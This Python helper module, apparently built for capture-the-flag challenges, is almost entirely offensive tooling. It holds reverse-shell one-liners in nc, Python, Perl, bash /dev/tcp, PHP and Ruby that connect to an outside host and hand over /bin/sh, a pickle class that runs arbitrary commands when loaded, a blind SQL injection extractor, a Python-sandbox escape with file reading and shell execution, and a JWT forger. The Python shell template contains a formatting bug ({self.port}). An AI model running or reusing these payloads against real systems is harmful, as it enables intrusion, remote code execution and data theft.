#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import math
import os
import pickle
import string
import time

import requests

#taken from https://github.com/lukechilds/reverse-shell
#and http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

rev_shells = {
	"nc":
		"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {host} {port} > /tmp/f",
	"python":
		"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{self.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
	"perl":
		"""perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
	"sh":
		"/bin/sh -i >& /dev/tcp/{host}/{port} 0>&1",
	"nc2":
		"nc -e /bin/sh {host} {port}",
	"php":
		"""php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""",
	"ruby":
		"""ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
}

def rev_shell(host, port, typ):
	return rev_shells[typ].format(host=host, port=port)

class PickleRCE:
	def __init__(self, cmd):
		self.cmd = cmd
	
	def __reduce__(self):
		return os.system, (self.cmd, )

def pickle_rev_shell(host, port, typ="python"):
	return pickle.dumps(PickleRCE(rev_shell(host, port, typ)))

_chars = (string.ascii_letters + string.digits + string.punctuation +
	string.whitespace).translate(str.maketrans("", "", "%_*?")) + "_?*%"
# make sure GLOB and LIKE special characters match last

def blind_sqli(inject_template, sqli_oracle, chars=_chars):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	while True:
		for c in chars:
			try:
				curr_val = val + c
				res = sqli_oracle(inject_template.format(curr_val))
				print(curr_val, res)
				if res:
					val = curr_val
					break
			except requests.exceptions.ConnectionError:  # really bad error handling
				time.sleep(1)
				break
		else:
			return val

class PyJail:
	"""makes interacting with python jails easier"""
	def __init__(self, fn):
		""" fn is the function to interact with the pyjail that takes and returns a string """
		self.fn = fn
		subclasses = "''.__class__.mro()[1].__subclasses__()"
		self.builtins = f"{subclasses}[-1].__init__.__globals__['__builtins__']"
	
	def run(self, s: str):
		"""directly run with s appended to self.builtins"""
		return self.fn(self.builtins + s)
	
	def call(self, fn: str, *args, module: str = None):
		"""call function"""
		return self.run(self._call(fn, *args, module))
	
	def cat(self, filename: str):
		return self.run(self._call("open", filename) + ".read()")
	
	def ls(self, folder: str = "."):
		return self.call("listdir", folder, module="os")
	
	def shell(self, cmd: str):
		return self.run(self._call("popen", cmd, module="os") + ".read()")
	
	def _import(self, module: str):
		return f"['__import__']({module!r})"
	
	def _call(self, fn: str, *args, module: str = None):
		if module is None:  # call builtin
			return f"[{fn!r}](*{args!r})"
		else:  # import module and then call function
			return self._import(module) + f".{fn}(*{args!r})"

# for weird challs like NahamCon CTF 2020 B'omarr Style
def non_json_jwt_encode(s: bytes, key, extra_headers=None):
	header_dict = {"alg": "HS256", "typ": "JWT"}
	if extra_headers is not None:
		header_dict.update(extra_headers)
	header = jwt_b64encode(json.dumps(header_dict).encode("utf-8"))
	payload = jwt_b64encode(s)
	
	signature = jwt_b64encode(
		hmac.new(key, header + b"." + payload, digestmod=hashlib.sha256).digest()
	)
	return b".".join((header, payload, signature))

def non_json_jwt_decode(token: bytes):
	header, token, _ = map(jwt_b64decode, token.split(b"."))
	return json.loads(header), token

def jwt_b64decode(s: bytes):
	padded_len = math.ceil(len(s) / 4) * 4
	return base64.urlsafe_b64decode(s.ljust(padded_len, b"="))

def jwt_b64encode(s: bytes):
	return base64.urlsafe_b64encode(s).rstrip(b"=")
